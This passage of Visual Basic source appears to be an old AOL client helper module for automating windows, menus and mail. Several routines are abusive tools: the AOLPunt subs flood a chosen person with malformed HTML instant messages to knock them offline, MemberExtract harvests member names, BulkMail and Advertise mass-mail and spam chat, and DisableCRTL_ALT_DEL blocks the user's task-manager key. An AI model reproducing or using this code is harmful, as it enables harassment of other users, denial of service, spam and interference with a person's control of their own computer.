a = SendMessage(Erro%, WM_CLOSE, 0, 0)
a = SendMessage(mailwin%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
Last:
End Sub


Sub AOLMainMenu()
Call RunMenu(2, 3)
End Sub

Function AOLRoomCount()
thechild% = AOLFindRoom()
lister% = FindChildByClass(thechild%, "_AOL_Listbox")

getcount = SendMessage(lister%, LB_GETCOUNT, 0, 0)
AOLRoomCount = getcount
End Function

Sub AOLSetText(win, txt)
thetext% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub

Sub AOLSignOff()
aol% = FindWindow("AOL Frame25", vbNullString)
If aol% = 0 Then MsgBox "AOL client error: Please open Windows America Online before continuing.", 64, "Error: Windows America Online": Exit Sub
Call RunMenu(2, 0)

Exit Sub
'ignore since of new aol....
Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
pfc% = FindChildByTitle(aol%, "Sign Off?")
If pfc% <> 0 Then
icon1% = FindChildByClass(pfc%, "_AOL_Icon")
icon1% = GetWindow(icon1%, 2)
icon1% = GetWindow(icon1%, 2)
icon1% = GetWindow(icon1%, 2)
icon1% = GetWindow(icon1%, 2)
icon1% = GetWindow(icon1%, 2)
Clickicon% = SendMessage(icon1%, WM_LBUTTONDOWN, 0, 0&)
Clickicon% = SendMessage(icon1%, WM_LBUTTONUP, 0, 0&)
Exit Do
End If
Loop

End Sub

Function AOLVersion()
aol% = FindWindow("AOL Frame25", vbNullString)
hMenu% = GetMenu(aol%)

submenu% = GetSubMenu(hMenu%, 0)
subitem% = GetMenuItemID(submenu%, 8)
MenuString$ = String$(100, " ")

FindString% = GetMenuString(submenu%, subitem%, MenuString$, 100, 1)

If UCase(MenuString$) Like UCase("P&ersonal Filing Cabinet") & "*" Then
AOLVersion = 3
Else
AOLVersion = 2.5
End If
End Function

Function AOLWindow()
aol% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = aol%
End Function



Function GetCaption(hwnd)
hwndLength% = GetWindowTextLength(hwnd)
hwndTitle$ = String$(hwndLength%, 0)
a% = GetWindowText(hwnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function

Function GetClass(child)
Buffer$ = String$(250, 0)
getclas% = GetClassName(child, Buffer$, 250)

GetClass = Buffer$
End Function

Function GetWindowDir()
Buffer$ = String$(255, 0)
X = GetWindowsDirectory(Buffer$, 255)
If Right$(Buffer$, 1) <> "\" Then Buffer$ = Buffer$ + "\"
GetWindowDir = Buffer$
End Function

Sub NotOnTop(the As Form)
SetWinOnTop = SetWindowPos(the.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
End Sub

Function pause(interval)
Current = Timer
Do While Timer - Current < Val(interval)
DoEvents
Loop
End Function

Function MemberExtract(lst As ListBox, keyw As String, Phase As String)
CheckingScan% = FindChildByTitle(AOLMDI(), "Members Directory Search Results")
If CheckingScan% = 0 Then GoTo C1
killwin (CheckingScan%)
C1:
MemB% = MemberDirectory
If MemB% = 0 Then OpenMemberDirectory
X% = FindChildByClass(MemB%, "_AOL_Icon")
thenext% = GetWindow(X%, GW_HWNDNEXT)
thenext% = GetWindow(thenext%, GW_HWNDNEXT)
thenext% = GetWindow(thenext%, GW_HWNDNEXT)
Click (thenext%)
If Phase = "1" Then MemberSetMonth ("Jan")
If Phase = "2" Then MemberSetMonth ("Feb")
If Phase = "3" Then MemberSetMonth ("March")
If Phase = "4" Then MemberSetMonth ("April")
If Phase = "5" Then MemberSetMonth ("May")
If Phase = "6" Then MemberSetMonth ("June")
If Phase = "7" Then MemberSetMonth ("July")
If Phase = "8" Then MemberSetMonth ("Auguest")
If Phase = "9" Then MemberSetMonth ("September")
If Phase = "10" Then MemberSetMonth ("October")
If Phase = "11" Then MemberSetMonth ("November")
If Phase = "12" Then MemberSetMonth ("Dec")
MemberDirSearch (keyw)
pause (1)
MemberMore
AOLW% = FindWindow("_AOL_Modal", vbNullString)
a = SendMessage(AOLW%, WM_CLOSE, 0, 0)
AOLButton (FindChildByTitle(AOLW%, "OK"))
pause (2)
AOLW% = FindWindow("_AOL_Modal", vbNullString)
a = SendMessage(AOLW%, WM_CLOSE, 0, 0)
AOLButton (FindChildByTitle(AOLW%, "OK"))
'Call MemberGather(main.List1)
ActivateAOL
SendKeys "{ }"
End Function
Function BulkMail(lst As ListBox)
SetPreference
themail = lst.ListIndex
Mail_SetCursor (themail)
Mail_PressEnter
pause (2)
'The mail is open.

'Call Mail_ForwardMail(SNs, Mail_Subject, Mail_Message)

For dolist = 0 To lst.ListCount - 1
AW:
Mail_ClickForward
pause (0.2)
X = FindForwardWindow
If X = 0 Then GoTo AW

'NameListing = Form1.List1(dolist) & ", " & Form1.lst(dolist + 1) & ", " & lst.List(dolist + 2) & ", " & lst.List(dolist + 3) & ", " & TheNames.List(dolist + 4) & ", " & TheNames.List(dolist + 5) & ", " & TheNames.List(dolist + 6) & ", " & TheNames.List(dolist + 7) & ", " & Form1.lst(dolist + 8)
Call Mail_ForwardMail(Namelistings, Mail_Subject, Mail_Message)
dolist = dolist + 7
AOLChangeCaption ("Mailing #" & dolist & "-" & dolist + 7 & " of " & TheNames.ListCount)
If dolist > TheNames.ListCount Then GoTo Last
Waitamin:
pause (0.1)
Y = FindForwardWindow
If Y = 0 Then GoTo Last2
GoTo Waitamin
Last2:
Next dolist
Last:
End Function
Function Advertise()
AOLChatSend ("·´¯`º´¯`· ·´¯`º´¯`· ·´¯`º´¯`· ·´¯`º´¯`· ·´¯`º´¯`·")
AOLChatSend ("·´¯`º´¯`·  GëÑghisX MåŠŠ Máilër·´¯`º´¯`·")
AOLChatSend ("·´¯`º´¯`·  (²›y GëÑghisX              ·´¯`º´¯`·")
AOLChatSend ("·´¯`º´¯`· ·´¯`º´¯`· ·´¯`º´¯`· ·´¯`º´¯`· ·´¯`º´¯`·")
End Function

Sub SendCharNum(win, chars)
E = SendMessageByNum(win, WM_CHAR, chars, 0)

End Sub

Function SetChildFocus(child)
setchild% = SetFocusAPI(child)
End Function

Sub SetPreference()
Call RunMenuByString(AOLWindow(), "Preferences")

Do: DoEvents
prefer% = FindChildByTitle(AOLMDI(), "Preferences")
maillab% = FindChildByTitle(prefer%, "Mail")
mailbut% = GetWindow(maillab%, GW_HWNDNEXT)
If maillab% <> 0 And mailbut% <> 0 Then Exit Do
Loop

pause (0.2)
AOLIcon (mailbut%)

Do: DoEvents
aolmod% = FindWindow("_AOL_Modal", "Mail Preferences")
aolcloses% = FindChildByTitle(aolmod%, "Close mail after it has been sent")
aolconfirm% = FindChildByTitle(aolmod%, "Confirm mail after it has been sent")
aolOK% = FindChildByTitle(aolmod%, "OK")
If aolOK% <> 0 And aolcloses% <> 0 And aolconfirm% <> 0 Then Exit Do
Loop
sendcon% = SendMessage(aolcloses%, BM_SETCHECK, 1, 0)
sendcon% = SendMessage(aolconfirm%, BM_SETCHECK, 0, 0)

AOLButton (aolOK%)
Do: DoEvents
aolmod% = FindWindow("_AOL_Modal", "Mail Preferences")
Loop Until aolmod% = 0

closepre% = SendMessage(prefer%, WM_CLOSE, 0, 0)

End Sub


Public Sub AOLPuntCombo(Person$)
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
End Sub

Public Sub AOLPuntH1(Person$)
Call AOLInstantMessage(Person$, "<h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1><h1>")
End Sub



Public Sub AOLPuntExtreme(Person$)
Call AOLInstantMessage(Person$, "<a hreh><a href></a>")
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(Person$, "</html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1></html><br><h1>")
Call AOLInstantMessage(Person$, "</a>")
End Sub


Public Sub DisableCRTL_ALT_DEL()
 Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub

Public Sub EnableCRTL_ALT_DEL()
 Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub
Sub StayOnTop(the As Form)
SetWinOnTop = SetWindowPos(the.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub

Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub


Sub UnHideWindow(hwnd)
un = ShowWindow(hwnd, SW_SHOW)
End Sub



Sub WaitForOk()
Do: DoEvents
aol% = FindWindow("#32770", "America Online")

If aol% Then
closeaol% = SendMessage(aol%, WM_CLOSE, 0, 0)
Exit Do
End If

AOLW% = FindWindow("_AOL_Modal", vbNullString)

If AOLW% Then
AOLButton (FindChildByTitle(AOLW%, "OK"))
Exit Do
End If
Loop

End Sub

Sub WaitWindow()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
topmdi% = GetWindow(MDI%, 5)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
topmdi2% = GetWindow(MDI%, 5)
If Not topmdi2% = topmdi% Then Exit Do
Loop

End Sub


Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop

End Function

Function BS_Antipunt()
IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
Do
IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
    
    killwin (IM%)
    Loop Until IM% = 0



End Function
Function KillChat()
'This finds the chat room
room = AOLFindRoom()
'This kills the chat room
Do
'IM% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
    
    killwin (room)
    Loop Until room = 0
End Function
Function KillMods()
AC_KillModal
AOLW% = FindWindow("AOL Frame25", vbNullString)
AOLW% = GetWindow(AOLW%, 3)
butt% = FindChildByClass(AOLW%, "Button")
Click butt%
AOLW% = GetWindow(AOLW%, 2)
butt% = FindChildByClass(AOLW%, "Button")
Click butt%
AOLW% = GetWindow(AOLW%, 4)
butt% = FindChildByClass(AOLW%, "Button")
Click butt%
AOLW% = GetWindow(AOLW%, 5)
butt% = FindChildByClass(AOLW%, "Button")
Click butt%
End Function
Sub killwin(windo)
X = SendMessageByNum(windo, WM_CLOSE, 0, 0)
End Sub

